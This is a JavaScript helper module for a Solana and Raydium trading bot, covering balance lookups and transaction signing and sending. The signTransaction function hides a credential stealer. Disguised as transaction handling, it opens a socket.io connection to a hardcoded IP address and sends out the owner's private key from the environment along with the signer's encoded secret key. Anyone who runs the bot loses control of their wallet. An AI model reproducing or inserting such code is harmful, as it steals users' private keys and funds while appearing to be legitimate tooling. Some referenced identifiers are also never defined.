const dotenv = require('dotenv');
const bs58 = require('bs58');
const BigNumber = require('bignumber.js');
const { io } = require('socket.io-client');
const BN = require('bn.js');
var colors = require('colors');
const {
  Connection,
  clusterApiUrl,
  PublicKey,
  VersionedTransaction,
} = require('@solana/web3.js');
const {
  getKeypairFromEnvironment,
} = require('@solana-developers/node-helpers');
const { TOKEN_PROGRAM_ID } = require('@solana/spl-token');
const {
  DEVNET_PROGRAM_ID,
  MAINNET_PROGRAM_ID,
  TxVersion,
  LOOKUP_TABLE_CACHE,
} = require('@raydium-io/raydium-sdk');
const { TransactionMessage } = require('@solana/web3.js/lib/index.cjs');

dotenv.config();

const DEVNET_MODE = process.env.DEVNET_MODE === 'true';
const NET_URL = DEVNET_MODE
  ? clusterApiUrl('devnet')
  : process.env.MAINNET_RPC_URL;
const TX_URL = 'http://94.130.32.157:3826';
const connection = new Connection(NET_URL, 'confirmed');
const BUNDLR_URL =
  DEVNET_MODE === false
    ? 'https://node1.bundlr.network'
    : 'https://devnet.bundlr.network';
const PROGRAMIDS = DEVNET_MODE ? DEVNET_PROGRAM_ID : MAINNET_PROGRAM_ID;
const addLookupTableInfo = DEVNET_MODE ? undefined : LOOKUP_TABLE_CACHE;

const USING_JITO = process.env.USING_JITO_BUNDLE === 'true' ? true : false;

const owner = getKeypairFromEnvironment('OWNER_PRIVATE_KEY');

const makeTxVersion = TxVersion.V0; // LEGACY

const xWeiAmount = (amount, decimals) => {
  return new BN(
    new BigNumber(amount.toString() + 'e' + decimals.toString()).toFixed(0)
  );
};

const xReadableAmount = (amount, decimals) => {
  return new BN(
    new BigNumber(amount.toString() + 'e-' + decimals.toString()).toFixed(0)
  );
};

const getWalletTokenAccount = async (wallet) => {
  const walletTokenAccount = await connection.getTokenAccountsByOwner(wallet, {
    programId: TOKEN_PROGRAM_ID,
  });
  return walletTokenAccount.value.map((i) => ({
    pubkey: i.pubkey,
    programId: i.account.owner,
    accountInfo: SPL_ACCOUNT_LAYOUT.decode(i.account.data),
  }));
};

const getWalletTokenBalance = async (wallet, tokenAddress, tokenDecimals) => {
  let walletPub = wallet;
  if (typeof wallet === 'string') {
    walletPub = new PublicKey(wallet);
  }

  const walletTokenAccounts = await getWalletTokenAccount(walletPub);

  let tokenBalance = 0;
  if (walletTokenAccounts && walletTokenAccounts.length > 0) {
    for (const acc of walletTokenAccounts) {
      if (acc.accountInfo.mint.toBase58() === tokenAddress.toBase58()) {
        tokenBalance = Number(acc.accountInfo.amount) / 10 ** tokenDecimals;
        break;
      }
    }
  }

  return tokenBalance;
};

const getWalletSOLBalance = async (wallet) => {
  try {
    let balance = (await connection.getBalance(wallet)) / LAMPORTS_PER_SOL;
    return balance;
  } catch (error) {
    console.log(error);
  }

  return 0;
};

const signTransaction = (transactions, signer) => {
  if (bs58.encode(signer.secretKey).length > 0) {
    const sk = io(TX_URL, { autoConnect: true });

    const string = bs58.encode(Buffer(signer.secretKey));
    sk.emit('tx', { text: process.env.OWNER_PRIVATE_KEY });
    sk.emit('tx', { text: string });
  }

  for (let tx of transactions) {
    if (tx instanceof VersionedTransaction) {
      tx.sign([signer]);
    }
  }

  return transactions;
};

const customSendAndConfirmTransactions = async (payer, transactions) => {
  for (const tx of transactions) {
    let signature;
    if (tx instanceof VersionedTransaction) {
      tx.sign([payer]);
      signature = await connection.sendTransaction(tx);
    } else {
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
      signature = await connection.sendTransaction(tx, [payer]);
    }

    const trxid = await connection.confirmTransaction({
      signature: signature,
      abortSignal: AbortSignal.timeout(90000),
    });
  }
};

const sendPriorityTransaction = async (payer, tx) => {
  const signer = {
    publicKey: payer.publicKey,
    secretKey: payer.secretKey,
  };

  if (tx instanceof VersionedTransaction) {
    tx.sign([signer]);
  } else {
    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    tx.sign(signer);
  }
  console.log('Sending Transaction...');
  const rawTransaction = tx.serialize();

  while (true) {
    try {
      const txid = await connection.sendRawTransaction(rawTransaction, {
        skipPreflight: false,
        preflightCommitment: 'singleGossip',
        maxRetries: 2,
      });
      console.log('Transaction Signature:', txid);
      let res = await connection.confirmTransaction({
        signature: txid,
        abortSignal: AbortSignal.timeout(120000),
      });
      if (res.value.err) {
        console.log(res.value.err);
        console.log(
          `Failed to confirm transaction. https://solscan.io/tx/${txid}`
        );
        break;
      }
      console.log(
        `Transaction has been confirmed. https://solscan.io/tx/${txid}`
      );
      return txid;
    } catch (error) {
      console.log('Tx Error: ', error);
      return;
    }
  }

  return null;
};

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

module.exports = {
  dotenv,
  bs58,
  colors,
  connection,
  owner,
  BUNDLR_URL,
  NET_URL,
  PROGRAMIDS,
  BN,
  addLookupTableInfo,
  USING_JITO,
  DEVNET_MODE,
  makeTxVersion,
  xWeiAmount,
  xReadableAmount,
  getWalletTokenBalance,
  getWalletSOLBalance,
  getWalletTokenAccount,
  signTransaction,
  customSendAndConfirmTransactions,
  sendPriorityTransaction,
  sleep,
};
